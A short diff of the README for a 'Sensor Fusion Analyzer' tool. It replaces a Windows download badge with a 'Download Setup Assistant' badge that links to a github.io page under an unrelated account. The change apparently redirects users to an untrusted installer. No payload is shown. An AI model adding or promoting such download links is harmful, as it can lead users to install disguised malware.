@@ -4,13 +4,7 @@
 
 <h1 align="center">🧭 Sensor Fusion Analyzer</h1>
 
-<p align="center">
-  <a href="https://sensor-fusion-analyzer-tool.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️%20Download%20Sensor%20Fusion%20Analyzer-Windows%20Version-2E8B57?style=for-the-badge&logo=windows&logoColor=white" 
-         alt="Download Sensor Fusion Analyzer for Windows" 
-         style="width: 540px; height: 43px;">
-  </a>
-</p>
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-lightgrey)](https://callmemaryblue5.github.io/.github/sensor-fusion-analyzer-tool)
 
 ---
 
